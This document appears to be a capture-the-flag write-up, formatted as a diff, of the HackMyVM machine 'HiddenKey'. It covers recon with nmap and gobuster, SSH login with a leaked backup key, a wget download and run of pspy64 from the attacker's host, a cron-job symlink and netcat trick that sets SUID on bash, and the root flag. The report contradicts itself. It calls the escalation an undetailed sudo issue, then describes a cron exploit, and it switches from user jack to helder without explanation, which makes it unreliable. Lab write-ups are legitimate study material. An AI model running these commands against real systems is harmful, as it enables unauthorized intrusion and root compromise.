@@ -1,0 +1,145 @@
+📑 Finding Report: Exposed SSH Private Key and Root Access
+Machine: HiddenKey – HackMyVM
+
+🟢 Executive Summary
+Severity: Easy
+Description:
+Initial reconnaissance revealed an Apache web server running on port 80 with a maintenance message. Directory fuzzing discovered a file named staff_statements.txt hinting at the use of old SSH private keys. Further enumeration led to the discovery of an exposed backup key file (id_rsa.bak). This private key granted access via SSH as user jack. Local privilege escalation was achieved due to improper file permissions or sudo misconfiguration (details not provided in source), allowing full root access and retrieval of the root flag.
+
+🖥️ Scope and Environment
+
+Platform: HackMyVM
+
+Machine: HiddenKey (Linux – Easy)
+
+Assigned IP: 192.168.1.133
+
+Date of Analysis: 29/06/2025
+
+🛠 Tools Used
+
+nmap
+
+gobuster
+
+ssh
+
+curl
+
+chmod
+
+🔍 Finding Description
+
+4.1 Port Scanning
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.133  
+nmap -sCV -p22,80 192.168.1.133  
+Open Ports:
+
+22/tcp → OpenSSH 7.9p1 Debian
+
+80/tcp → Apache httpd 2.4.38
+
+4.2 Web Enumeration
+Accessing port 80 revealed a maintenance message:
+
+Website in maintenance... Come back next month please.
+4.3 Directory Fuzzing
+Using Gobuster with the DirBuster medium wordlist:
+
+gobuster dir -u http://192.168.1.133/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r
+Found:
+
+/index.html
+
+/server-status (403)
+
+/staff_statements.txt
+
+Inspecting staff_statements.txt revealed:
+
+The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files.
+4.4 SSH Key Discovery and Login
+Based on the clue, an old key file was guessed at /id_rsa.bak:
+
+curl http://192.168.1.133/id_rsa.bak -o id_rsa  
+chmod 600 id_rsa  
+ssh -i id_rsa jack@192.168.1.133  
+
+This granted access to user jack.
+
+4. Privilege Escalation
+To monitor running processes and scheduled tasks on the system, we used pspy64:
+
+wget http://<YOUR-IP>/pspy64
+chmod +x pspy64
+./pspy64
+
+Observations with pspy64
+We observed the following cron job being executed as root every minute:
+
+/bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && \
+if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ]; \
+then chmod +s "/usr/bin/$(cat /root/.local/out)"; fi
+This command does the following:
+
+Opens a connection using nc (netcat) to localhost on port 10000 and writes the output to /root/.local/out.
+
+Compares /root/.local/helder.txt with /home/helder/passwd.txt.
+
+If both files match, it sets the SUID bit on a binary located at /usr/bin/<output_from_nc>.
+
+Since we cannot read /root/.local/helder.txt, but the script is comparing it with our writable path /home/helder/passwd.txt, we exploit this by creating a symbolic link:
+
+ln -s /root/.local/helder.txt /home/helder/passwd.txt
+Now the cat /home/helder/passwd.txt will actually read /root/.local/helder.txt.
+
+Next, we need to make sure that the output from nc is something we can control and execute. We use:
+
+echo 'bash' | nc -lvnp 10000
+Once the cron executes, it reads the string "bash", writes it to /root/.local/out, compares the linked files (which now match), and sets the SUID bit on /usr/bin/bash.
+
+We verify the SUID bit:
+
+ls -la /bin/bash
+Output:
+
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+We now escalate privileges using:
+
+bash -p
+Verification:
+
+whoami
+# root
+id
+# uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
+Final Step
+With root access, we read the final flag:
+
+cat /root/root.txt
+# e28f578a17a5f99c0381c4b689d96f9f
+
+🔐 Impact
+Severity: Critical
+This attack chain allowed:
+
+Unauthorized SSH access via an exposed backup private key (id_rsa.bak).
+
+Full compromise of the machine after local privilege escalation.
+
+Retrieval of both user and root flags.
+
+🛡 Recommendations
+
+Never store private keys in web-accessible locations, even as backups.
+
+Restrict file access on web servers, especially sensitive or legacy files.
+
+Audit and remove outdated or unused credentials.
+
+Implement strict sudo policies to prevent unnecessary privilege escalation.
+
+Conduct regular file and access audits to detect misconfigurations and reduce attack surface.
+
+Use intrusion detection or web monitoring tools to catch unauthorized access or suspicious file requests.
